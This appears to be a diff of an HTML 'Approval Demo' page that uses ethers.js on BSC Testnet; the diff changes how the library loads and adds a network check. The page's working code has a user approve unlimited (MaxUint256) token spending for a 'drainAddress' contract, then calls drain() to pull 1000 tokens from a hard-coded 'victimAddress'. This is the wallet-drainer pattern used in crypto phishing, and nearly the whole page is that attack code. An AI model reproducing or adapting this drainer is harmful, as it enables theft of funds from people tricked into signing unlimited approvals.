@@ -2,6 +2,7 @@
 <html>
 <head>
   <title>Approval Demo</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 </head>
 
 <body style="font-family:sans-serif">
@@ -13,31 +14,8 @@
 <button onclick="drain()">Drain Tokens</button>
 
 <script>
-let provider, signer, userAddress, ethersLib;
+let provider, signer;
 
-// 🔥 Load ethers dynamically
-async function loadEthers() {
-  return new Promise((resolve, reject) => {
-    const script = document.createElement("script");
-    script.src = "https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js";
-
-    script.onload = () => {
-      ethersLib = window.ethers;
-      console.log("Ethers loaded:", ethersLib);
-      resolve();
-    };
-
-    script.onerror = reject;
-    document.head.appendChild(script);
-  });
-}
-
-// Initialize on load
-window.onload = async () => {
-  await loadEthers();
-};
-
-// CONFIG
 const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";
 const drainAddress = "0x0ccb058f48f5caa16c7026e7d34c103544c2d172";
 const victimAddress = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";
@@ -50,7 +28,7 @@ const drainABI = [
   "function drain(address token, address victim, uint256 amount) public"
 ];
 
-// CONNECT
+// CONNECT (no forced network switch)
 async function connect() {
   try {
     if (!window.ethereum) {
@@ -58,19 +36,22 @@ async function connect() {
       return;
     }
 
-    if (!ethersLib) {
-      alert("Ethers not loaded yet, wait 1 sec and retry");
+    // 🔴 IMPORTANT: user must already be on BSC Testnet
+    const chainId = await window.ethereum.request({ method: "eth_chainId" });
+
+    if (chainId !== "0x61") {
+      alert("⚠️ Switch to BSC Testnet manually first");
       return;
     }
 
     await window.ethereum.request({ method: "eth_requestAccounts" });
 
-    provider = new ethersLib.providers.Web3Provider(window.ethereum);
+    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
     signer = provider.getSigner();
 
-    userAddress = await signer.getAddress();
+    const address = await signer.getAddress();
 
-    alert("✅ Connected: " + userAddress);
+    alert("✅ Connected: " + address);
 
   } catch (e) {
     alert("❌ Connect error: " + e.message);
@@ -85,11 +66,11 @@ async function approve() {
       return;
     }
 
-    const contract = new ethersLib.Contract(tokenAddress, tokenABI, signer);
+    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);
 
     const tx = await contract.approve(
       drainAddress,
-      ethersLib.constants.MaxUint256
+      ethers.constants.MaxUint256
     );
 
     await tx.wait();
@@ -109,12 +90,12 @@ async function drain() {
       return;
     }
 
-    const contract = new ethersLib.Contract(drainAddress, drainABI, signer);
+    const contract = new ethers.Contract(drainAddress, drainABI, signer);
 
     const tx = await contract.drain(
       tokenAddress,
       victimAddress,
-      ethersLib.utils.parseUnits("1000", 18)
+      ethers.utils.parseUnits("1000", 18)
     );
 
     await tx.wait();
